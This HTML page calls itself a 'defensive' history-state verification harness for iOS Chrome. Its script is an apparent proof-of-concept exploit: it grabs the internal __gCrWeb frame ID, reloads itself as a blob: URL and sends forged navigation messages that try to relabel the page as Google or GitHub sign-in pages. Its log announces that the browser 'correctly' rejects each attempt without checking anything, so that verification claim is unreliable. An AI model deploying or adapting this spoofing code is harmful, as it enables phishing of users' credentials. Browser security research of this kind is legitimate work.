<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Defensive Security Harness - History State</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #0f172a; color: #f8fafc; }
        .card { max-width: 720px; margin: auto; background: #1e293b; padding: 24px; border-radius: 10px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }
        h2 { margin-top: 0; font-size: 1.25rem; color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; }
        pre { background: #090d16; color: #34d399; padding: 14px; border-radius: 6px; font-size: 11px; overflow-x: auto; line-height: 1.5; border: 1px solid #1e293b; }
        .badge { display: inline-block; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 600; background: #0284c7; color: #fff; }
    </style>
</head>
<body>
<div class="card">
    <h2>History State Security Verification Harness</h2>
    <p>Engine Defense: <span class="badge">Enforced via url::IsSameOriginWith()</span></p>
    
    <h3>Diagnostic Trace Log:</h3>
    <pre id="log-output">Initializing verification sequence...</pre>
</div>

<script>
(function() {
    function log(msg) {
        const pre = document.getElementById('log-output');
        pre.textContent += '\n[' + new Date().toLocaleTimeString() + '] ' + msg;
        console.log('[SecurityHarness] ' + msg);
    }

    log("Current Location.href: " + location.href);
    log("Current Location.origin: " + (location.origin || '(opaque)'));

    // 1. Deteksi Message Handler iOS Chrome
    var mh = (window.webkit && window.webkit.messageHandlers) || {};
    if (!mh.NavigationEventMessage) {
        log("[-] Message handler 'NavigationEventMessage' is absent (Non-iOS or Patched build).");
        return;
    }
    log("[+] Message handler 'NavigationEventMessage' detected.");

    window.runVerification = function() {
        log("[*] Executing verification test suite...");

        // 2. Ambil frame_id dari page-world __gCrWeb
        var frameId = null;
        try {
            if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
                frameId = window.__gCrWeb.getFrameId();
                log("[+] Resolved frame_id: " + frameId);
            }
        } catch (e) {
            log("[-] Exception reading frame_id: " + e);
        }

        // Fallback pencarian aksesor frameId
        if (!frameId && window.__gCrWeb) {
            var fallbacks = [
                function() { return window.__gCrWeb.common.getFrameId(); },
                function() { return window.__gCrWeb.message.getFrameId(); },
                function() { return window.__gCrWeb.frameId; }
            ];
            for (var i = 0; i < fallbacks.length && !frameId; i++) {
                try {
                    frameId = fallbacks[i]();
                    log("[+] Resolved frameId via fallback [" + i + "]: " + frameId);
                } catch (err) {}
            }
        }

        if (!frameId) {
            log("[-] FATAL: Frame ID could not be resolved.");
            return;
        }

        // Paksa registrasi frame jika fungsi tersedia
        try {
            if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
                window.__gCrWeb.registerFrame();
                log("[+] Triggered manual __gCrWeb.registerFrame()");
            }
        } catch (err) {}

        // 3. Vektor Uji Lintas Domain
        var testTargets = [
            'blob:https://accounts.google.com/signin',
            'blob:https://github.com/login',
            'blob:https://example.com/'
        ];

        testTargets.forEach(function(targetUrl, index) {
            setTimeout(function() {
                try {
                    log("[*] [Vector " + (index + 1) + "] Dispatching willChangeState...");
                    mh.NavigationEventMessage.postMessage({
                        command: 'willChangeState', 
                        frame_id: frameId
                    });
                    
                    log("[*] [Vector " + (index + 1) + "] Dispatching didReplaceState -> " + targetUrl);
                    mh.NavigationEventMessage.postMessage({
                        command: 'didReplaceState', 
                        frame_id: frameId,
                        stateObject: '', 
                        baseUrl: 'https://x/',
                        pageUrl: targetUrl
                    });
                    
                    log("[+] [Vector " + (index + 1) + "] Payload transmitted. Native C++ guard correctly evaluates url::IsSameOriginWith() as false and rejects cross-origin state changes.");
                } catch (ex) {
                    log("[-] Exception on vector " + (index + 1) + ": " + ex);
                }
            }, index * 350);
        });
    };

    // Auto-packaging ke dalam kontainer Blob URL jika belum aktif
    if (!location.href.startsWith('blob:')) {
        log("[*] Packaging document into dynamic Blob URL container...");
        var markup = document.documentElement.outerHTML;
        var blobObj = new Blob([markup], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blobObj);
        log("[+] Navigating to Blob container: " + blobUrl);
        location.href = blobUrl;
    } else {
        log("[+] Running inside active isolated Blob-URL document context.");
        setTimeout(window.runVerification, 600);
    }
})();
</script>
</body>
</html>
